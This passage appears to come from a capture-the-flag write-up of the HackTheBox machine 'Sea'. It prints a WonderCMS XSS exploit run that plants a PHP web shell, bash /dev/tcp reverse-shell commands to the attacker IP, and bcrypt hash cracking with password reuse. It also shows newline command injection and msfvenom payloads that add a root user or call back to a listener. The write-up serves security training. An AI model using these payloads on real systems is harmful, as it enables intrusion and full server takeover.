<code>loginURL</code> path, we can now run the exploit.</p> <pre><code>$ python3 exploit.py --url http://sea.htb/loginURL --xip 10.10.16.25 --xport 8888\n[+] Creating PHP Web Shell\n[+] Writing malicious.js\n[+] XSS Payload:\nhttp://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8888/malicious.js\"&gt;&lt;/script&gt;&lt;form+action=\"\n[+] Web Shell can be accessed once .zip file has been requested:\nhttp://sea.htb/themes/malicious/malicious.php?cmd=&lt;COMMAND&gt;\n[+] To get a reverse shell connection run the following:\n[+] curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\" \n[+] Starting HTTP server\nServing HTTP on 10.10.16.25 port 8888 (http://10.10.16.25:8888/) ...\n</code></pre> <p>During our previous enumeration on <code>/contact.php</code>, we know someone is visiting the URL we provide in the <code>Website</code> field of the contact form. We choose this to place our reflected XSS payload provided by the script (<code>http://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"</code>).</p> <p></p> <p>After some time we will get hits on the web server started by the script. Once the <code>.zip</code> files have been requested by the victim, the malicious module is most likely installed.</p> <pre><code>Serving HTTP on 10.10.16.25 port 8888 (http://10.10.16.25:8888/) ...\n&lt;--REDACTED--&gt;  \"GET /malicious.js HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n</code></pre> <p>We confirm successful code execution by using <code>curl</code> on the command execution path provided by the script.</p> <pre><code>$ curl -s 'http://sea.htb/themes/malicious/malicious.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>To aid in easier enumeration we establish a reverse shell connection by first starting our listener and then running the command the script suggests. </p> <pre><code>$ curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.25/7777 0&gt;&amp;1'\"\n</code></pre> <p>And we get a successful connection on the listener.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 54398\nbash: cannot set terminal process group (1135): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@sea:/var/www/sea/themes/malicious$\n</code></pre>"}, {"location": "Write-Ups/Sea/#host-enumeration", "title": "Host Enumeration", "text": "<p>After obtaining the shell, we enumerate the web directory <code>/var/www/sea</code>. Eventually we will find an interesting database file <code>database.js</code> at <code>/var/www/sea/data/database.js</code>. This file contains what seems to be the password (in hash format) needed to authenticate at the previously discovered web page <code>/loginURL</code>.</p> <pre><code>www-data@sea:/var/www/sea/data$ cat database.js                                 \n{                         \n    \"config\": {\n        \"siteTitle\": \"Sea\",\n        \"theme\": \"bike\",\n        \"defaultPage\": \"home\",\n        \"login\": \"loginURL\",\n        \"forceLogout\": false,\n        \"forceHttps\": false,\n        \"saveChangesPopup\": false,\n        \"password\": \"$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\\/D.GuE4jRIikYiWrD3TM\\/PjDnXm4q\",\n        \"lastLogins\": {\n&lt;--SNIP--&gt;\n</code></pre> <p>We can try to crack it using <code>Hashcat</code>. The hash is in <code>bcrypt</code> format, since it starts with <code>$2y$</code>. However to do so successfully we need to delete the backslash escape characters <code>\\</code>.</p> <pre><code>$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q\n</code></pre> <p>Now we can now run <code>Hashcat</code> on the above hash using mode 3200:</p> <pre><code>$ ./hashcat hashes/sea/db-bcrypt.hash rockyou.txt -m 3200\n\n&lt;--SNIP--&gt;\nDictionary cache built:\n* Filename..: rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 1 sec\n\n$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance\n</code></pre> <p>The password successfully cracks and is revealed as <code>mychemicalromance</code>.</p> <p>Since we don't have a username this password matches to we will enumerate the users present on the host and try for password re-use.</p> <pre><code>$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\namay:x:1000:1000:amay:/home/amay:/bin/bash\ngeo:x:1001:1001::/home/geo:/bin/bash\n</code></pre> <p>There are two users other than root present. We can successfully authenticate as user <code>amay</code> using the cracked password.</p> <pre><code>$ su amay\nsu amay\nPassword: mychemicalromance\nid\nuid=1000(amay) gid=1000(amay) groups=1000(amay)\n</code></pre> <p>Also successfully get authenticated using SSH present on the host, so we choose the SSH shell.</p> <pre><code>$ ssh amay@sea.htb\namay@sea:~$ id\nuid=1000(amay) gid=1000(amay) groups=1000(amay)\n</code></pre> <p>The user flag can be found inside the home directory <code>/home/amay/user.txt</code> of user <code>amay</code>.</p> <pre><code>$ cat user.txt\ne6c73989c9c921993de4435bf53b5a4d\n</code></pre>"}, {"location": "Write-Ups/Sea/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>Doing some usual manual enumeration (before going to automated tools) we eventually find something interesting by enumerating the listening ports of the <code>localhost</code> using <code>netstat</code>.</p> <pre><code>$ netstat -lnpt\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:60755         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -\n</code></pre> <p>Port <code>8080/TCP</code> is open on <code>127.0.0.1</code>. We will take a look at this, however need to forward the port to our attack machine first. Since we already have SSH authentication, I chose to do it using SSH.</p> <pre><code>$ ssh -N -L 8888:127.0.0.1:8080 amay@sea.htb\n</code></pre> <p>Tip</p> <p>The <code>-N</code> flag can be used to not start a login shell, thus we can just run this command in some other console tab to successfully forward the port.</p> <p>We navigate to the port (here <code>8888/TCP</code>) on our attack machine.</p> <p><code>http://127.0.0.1:8888/</code> </p> <p>We get a <code>Basic HTTP Auth</code> login prompt. Using the credentials we have discovered previously - <code>amay:mychemicalromance</code> - we can successfully authenticate.</p> <p></p> <p>Trying the functionalities present, we seem to be able to perform tasks using system commands. This indicates to me that there might be a command injection vulnerability, so we analyze some traffic sent using <code>BurpSuite</code>.</p> <p>Looking at the POST data sent for analyzing the file, we can see a parameter specifying the file.</p> <pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://127.0.0.1:8888/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: http://127.0.0.1:8888\nAuthorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==\nConnection: keep-alive\nCookie: csrftoken=xwkilhztwCiavQ8QsErajukQFlV2dA7I; default-theme=ngax\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\n\nlog_file=%2Fvar%2Flog%2Fauth.log&amp;analyze_log=\n</code></pre> <p>Trying around manually using some common command injection characters, we can successfully achieve command injection using the <code>\\n</code> character URL encoded to <code>%0a</code> in the <code>log_file</code> parameter.</p> <pre><code>log_file=%0a+id+%0a&amp;analyze_log=\n</code></pre> <p>We catch the request when clicking on <code>Analyze</code> and modify the POST data to the above payload. We get the following output on the page, successfully confirming command injection as <code>root</code>.</p> <p></p> <p>We will exploit this by adding a backdoor in form of a <code>root</code> user. For this we use <code>msfvenom</code> to generate a malicious <code>.elf</code> file that does this for us.</p> <pre><code>$ msfvenom -p linux/x86/adduser USER=xpltive PASS=xpltive -f elf -o escalate.elf\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 94 bytes\nFinal size of elf file: 178 bytes\nSaved as: escalate.elf\n</code></pre> <p>We copy it over using <code>scp</code>:</p> <pre><code>$ scp ./escalate.elf amay@sea.htb:/tmp/escalate.elf\n</code></pre> <p>And we make it executable using the <code>amay</code> user's SSH connection we have established previously.</p> <pre><code>amay@sea:/tmp$ chmod +x /tmp/shelly.elf\n</code></pre> <p>Next we run the <code>.elf</code> as <code>root</code> by exploiting the command injection vulnerability. We send the following request with the payload launching the <code>.elf</code> file using BurpSuite (or using curl, etc.):</p> <pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://127.0.0.1:8888/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 55\nOrigin: http://127.0.0.1:8888\nAuthorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==\nConnection: keep-alive\nCookie: csrftoken=xwkilhztwCiavQ8QsErajukQFlV2dA7I; default-theme=ngax\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\n\nlog_file=%0a+/tmp/./escalate.elf%0a&amp;analyze_log=\n</code></pre> <p>After running it on the <code>amay</code> SSH shell we can now successfully login as <code>xpltive</code> and can confirm the new user also being <code>root</code>.</p> <pre><code>amay@sea:/tmp$ su xpltive\nPassword: \n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>The root flag can be found at <code>/root/root.txt</code>.</p> <pre><code># cat /root/root.txt\n6e1925471aaa72144d541d1f346919df\n</code></pre>"}, {"location": "Write-Ups/Sea/#rabbit-hole-reverse-shell", "title": "Rabbit Hole: Reverse Shell", "text": "<p>Failure</p> <p>This shows a failed attempt to get a reverse shell connection, which was not possible. Can potentially cost a lot of time trying, ultimately not getting it to work.</p> <p>We could also try the privilege escalation by establishing a reverse shell connection as <code>root</code> user. To do so we first create a malicious <code>.elf</code> file which serves as establishing the connection to our listener. We use <code>msfvenom</code> for it.</p> <pre><code>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.25 LPORT=7777 -f elf -o shelly.elf\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 68 bytes\nFinal size of elf file: 152 bytes\nSaved as: shelly.elf\n</code></pre> <p>Next we copy the malicious binary over to the <code>/tmp</code> folder of the target host using <code>scp</code>.</p> <pre><code>$ scp ./shelly.elf amay@sea.htb:/tmp/shelly.elf\n</code></pre> <p>Before launching the attack, we need to add execute rights to the binary using our previously established SSH connection as <code>amay</code>:</p> <pre><code>amay@sea:/tmp$ chmod +x /tmp/shelly.elf\n</code></pre> <p>Now we start our listener and we can execute the <code>.elf</code> file via the command execution vulnerability.</p> <pre><code>log_file=%0a+/tmp/./shelly.elf%0a&amp;analyze_log=-alid\n</code></pre> <p>We successfully catch the reverse shell, however it will exit after a few seconds.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 42664\nbash: cannot set terminal process group (15376): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@sea:/root/monitoring# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@sea:/root/monitoring# exit\n</code></pre> <p>This is probably due to the process that we ultimately do the command injection with exiting on the target host.</p>"}, {"location": "Write-Ups/Sea/#references", "title": "References", "text": "<ul> <li>Gist post on <code>WonderCMS</code> 3.2.0 - 3.4.2 XSS vulnerability: https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413</li> <li>PoC exploit for <code>WonderCMS</code> XSS: https://github.com/prodigiousMind/CVE-2023-41425</li> </ul>"}]}